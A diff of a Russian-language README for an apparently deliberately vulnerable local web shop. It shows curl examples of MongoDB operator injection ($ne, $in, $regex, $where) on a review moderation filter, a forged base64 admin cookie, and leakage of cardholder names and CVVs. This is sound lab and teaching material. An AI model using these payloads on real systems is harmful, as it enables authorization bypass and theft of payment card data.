@@ -103,43 +103,37 @@ curl "http://localhost:8000/admin/reports?u=alice" -b "role=YWRtaW4="
 ```
 
 ### NoSQL Injection (`/product/<pid>/reviews/moderation`)
-Сценарий: сначала при checkout сохраняется объект карты в Mongo (`payment_cards`), после чего в админ-модерации можно сделать operator injection в поле `cardholder`.
+Сценарий: фильтр модерации принимает JSON-like значения в `author`, `rating`, `text`, `cardholder`. Для демонстрации можно использовать Mongo-операторы `$where`, `$ne`, `$in`, `$regex`.
 
-1) Создать заказ с картой через `/cart/checkout` (форма корзины теперь просит cardholder/card/exp/cvv).
-2) Открыть `/product/1/reviews/moderation` под админом.
-3) В `cardholder` отправить операторный payload.
+1) Войти как админ (или подменить cookie `role=YWRtaW4=`).
+2) Открыть `/product/1/reviews/moderation`.
+3) Передавать JSON в поля фильтра (GET query или POST form).
 
+Примеры эксплуатации:
 ```bash
-curl -X POST "http://localhost:8000/product/1/reviews/moderation" \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  -d 'cardholder={"cardholder":{"$ne":null}}' \
+# $ne: получить все отзывы, где автор не alice
+curl "http://localhost:8000/product/1/reviews/moderation?author={\"$ne\":\"alice\"}&status=all" \
+  -b "role=YWRtaW4="
+
+# $in: выбрать отзывы с рейтингом 4 или 5
+curl "http://localhost:8000/product/1/reviews/moderation?rating={\"$in\":[4,5]}&status=all" \
+  -b "role=YWRtaW4="
+
+# $regex: поиск по тексту отзыва
+curl "http://localhost:8000/product/1/reviews/moderation?text={\"$regex\":\".*great.*\",\"$options\":\"i\"}&status=all" \
+  -b "role=YWRtaW4="
+
+# $where: top-level JavaScript выражение в запросе отзывов
+curl "http://localhost:8000/product/1/reviews/moderation?author={\"$where\":\"this.rating>=4\"}&status=all" \
   -b "role=YWRtaW4="
 ```
 
-Проверка операторов Mongo (через `cardholder` поле):
+Аналогично для `payment_cards` (утечка cardholder/cvv через блок Results):
 ```bash
-# $ne
 curl -X POST "http://localhost:8000/product/1/reviews/moderation" \
   -H "Content-Type: application/x-www-form-urlencoded" \
-  --data-urlencode 'cardholder={"cardholder":{"$ne":""}}' \
-  -b "role=YWRtaW4="
-
-# $in
-curl -X POST "http://localhost:8000/product/1/reviews/moderation" \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  --data-urlencode 'cardholder={"cardholder":{"$in":["Alice Hightower","Admin River North"]}}' \
-  -b "role=YWRtaW4="
-
-# $regex
-curl -X POST "http://localhost:8000/product/1/reviews/moderation" \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  --data-urlencode 'cardholder={"cardholder":{"$regex":"^Alice"}}' \
-  -b "role=YWRtaW4="
-
-# $where (top-level query)
-curl -X POST "http://localhost:8000/product/1/reviews/moderation" \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  --data-urlencode 'cardholder={"$where":"this.cardholder && this.cvv"}' \
+  --data-urlencode 'cardholder={"$regex":"^Alice"}' \
+  --data-urlencode 'status=all' \
   -b "role=YWRtaW4="
 ```
 
